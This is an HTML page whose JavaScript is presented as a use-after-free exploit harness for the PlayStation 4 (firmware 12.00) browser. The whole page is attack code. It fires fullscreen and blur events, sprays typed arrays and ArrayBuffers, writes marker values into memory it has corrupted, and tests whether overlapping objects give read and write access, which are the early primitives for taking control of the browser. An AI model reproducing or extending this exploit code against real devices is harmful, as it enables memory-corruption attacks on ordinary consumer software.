<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PS4 12.00 UAF - Optimized & Reduced</title>
<style>
    body { background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
    button { width: 100%; padding: 15px; margin: 5px 0; background: #333; color: white; border: 1px solid #555; cursor: pointer; font-weight: bold; }
    button:hover { background: #555; }
    #log { background: #000; border: 1px solid #00ff00; padding: 10px; height: 300px; overflow-y: scroll; white-space: pre-wrap; margin-top: 10px; }
    .success { color: #00ff00; font-weight: bold; }
    .fail { color: #ff0000; font-weight: bold; }
    .warn { color: #ffff00; }
</style>
</head>
<body>

<h2>PS4 12.00 UAF - REDUCED & SYNCED</h2>

<button onclick="stage1()">1. SETUP & CORRUPT (REQUIRED)</button>
<button onclick="test_uint32()">2. TEST UINT32 OVERLAP</button>
<button onclick="test_dataview()">3. TEST DATAVIEW OVERLAP</button>
<button onclick="test_arraybuffer()">4. TEST ARRAYBUFFER OVERLAP</button>

<div id="log">Logs will appear here...</div>

<script>
// --- GLOBALS ---
var g_first = null; // The master corrupted array
var g_arrays = [];  // Keep references to prevent GC pre-maturely
const P = 2.121995791e-314; // The magic float value

// --- UTILS ---
function log(msg, type='') {
    const l = document.getElementById('log');
    l.innerHTML += `<span class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</span>\n`;
    l.scrollTop = l.scrollHeight;
}

// --- ROBUST TRIGGER ENGINE ---
function runTrigger(payloadCallback) {
    log("Initializing trigger sequence...", "warn");
    
    // 1. Request Fullscreen
    if(document.documentElement.webkitRequestFullscreen) {
        document.documentElement.webkitRequestFullscreen();
    } else {
        log("Fullscreen API not supported/allowed!", "fail");
        return;
    }

    // 2. Force Focus
    window.focus();

    log("WAITING... Click the screen once, then press OPTIONS.", "warn");

    // 3. Set Event Listener with Delay (Crucial for PS4)
    setTimeout(() => {
        window.onblur = function() {
            log("Event 'blur' detected! Running payload...", "warn");
            window.onblur = null; // Remove listener immediately
            
            // Execute the specific test payload
            try {
                payloadCallback();
            } catch(e) {
                log("Payload Error: " + e.message, "fail");
            }
        };
    }, 1000);
}

// --- STAGE 1: SETUP ---
function stage1() {
    g_arrays = [];
    g_first = null;
    
    log("Allocating base arrays...");
    for(let i = 0; i < 5000; i++) {
        const a = new Float64Array(8);
        a[0] = i; 
        g_arrays.push(a);
    }

    runTrigger(() => {
        // The Spray inside the trigger
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }

        // Check corruption
        const corrupted = g_arrays.filter(a => a[0] === P);
        if(corrupted.length > 0) {
            g_first = corrupted[0];
            
            // Mark the memory
            const view = new DataView(g_first.buffer);
            view.setUint32(0, 0xAABBCCDD, true); // Marker 1
            view.setUint32(4, 0x11223344, true); // Marker 2
            
            log("SUCCESS: Corruption Confirmed!", "success");
            log(`Found ${corrupted.length} candidates.`);
            log("Markers written: 0xAABBCCDD, 0x11223344");
        } else {
            log("FAILED: No corruption found. Try again.", "fail");
        }
    });
}

// --- TEST 2: UINT32 OVERLAP ---
function test_uint32() {
    if(!g_first) return log("Run Stage 1 first!", "fail");
    
    log("Starting Uint32 Confusion Test...");
    
    runTrigger(() => {
        // Spray Uint32Array explicitly inside the event
        const spray = [];
        for(let i = 0; i < 5000; i++) {
            const u = new Uint32Array(16);
            u.fill(0x41414141); // 'AAAA'
            spray.push(u);
        }
        
        // Scan for our markers from Stage 1
        let found = false;
        for(let i = 0; i < spray.length; i++) {
            // Check if this Uint32Array is pointing to g_first's memory
            if(spray[i][0] === 0xAABBCCDD) {
                found = true;
                log(`Overlap Found at spray index ${i}!`, "success");
                
                // Verify write access
                spray[i][0] = 0x99999999;
                const check = new DataView(g_first.buffer).getUint32(0, true);
                
                if(check === 0x99999999) {
                    log("WRITE CONFIRMED: Uint32 -> Float64", "success");
                } else {
                    log("Write failed (Read-only?)", "fail");
                }
                break;
            }
        }
        if(!found) log("No Uint32 overlap detected.", "fail");
    });
}

// --- TEST 3: DATAVIEW OVERLAP ---
function test_dataview() {
    if(!g_first) return log("Run Stage 1 first!", "fail");
    
    log("Starting DataView Confusion Test...");

    runTrigger(() => {
        const spray = [];
        for(let i = 0; i < 2000; i++) {
            const buf = new ArrayBuffer(64);
            const dv = new DataView(buf);
            dv.setUint32(0, 0x55555555, true);
            spray.push(dv);
        }

        let found = false;
        for(let i = 0; i < spray.length; i++) {
            if(spray[i].getUint32(0, true) === 0xAABBCCDD) {
                found = true;
                log(`Overlap Found in DataView ${i}!`, "success");
                
                // Try write
                spray[i].setUint32(0, 0x88888888, true);
                const check = new DataView(g_first.buffer).getUint32(0, true);
                
                if(check === 0x88888888) log("WRITE CONFIRMED: DataView -> Float64", "success");
                break;
            }
        }
        if(!found) log("No DataView overlap detected.", "fail");
    });
}

// --- TEST 4: ARRAYBUFFER OVERLAP ---
function test_arraybuffer() {
    if(!g_first) return log("Run Stage 1 first!", "fail");

    log("Starting ArrayBuffer Confusion Test...");

    runTrigger(() => {
        const spray = [];
        for(let i = 0; i < 5000; i++) {
            const buf = new ArrayBuffer(64);
            // Fill utilizing a view, but we care about the buffer
            new Uint32Array(buf).fill(0x77777777);
            spray.push(buf);
        }

        let found = false;
        for(let i = 0; i < spray.length; i++) {
            // Create a temporary view to check the buffer content
            const checkView = new Uint32Array(spray[i]);
            if(checkView[0] === 0xAABBCCDD) {
                found = true;
                log(`Overlap Found in ArrayBuffer ${i}!`, "success");
                break;
            }
        }
        if(!found) log("No ArrayBuffer overlap detected.", "fail");
    });
}

</script>
</body>
</html>
